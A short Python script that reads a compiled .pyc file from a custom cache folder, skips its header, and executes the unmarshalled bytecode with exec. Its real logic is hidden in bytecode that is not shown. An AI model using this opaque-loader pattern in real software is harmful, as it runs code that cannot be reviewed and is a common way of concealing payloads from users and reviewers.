
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'value_out_put_8b2c3c4f79bd4cecad555b7ec4ada699.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
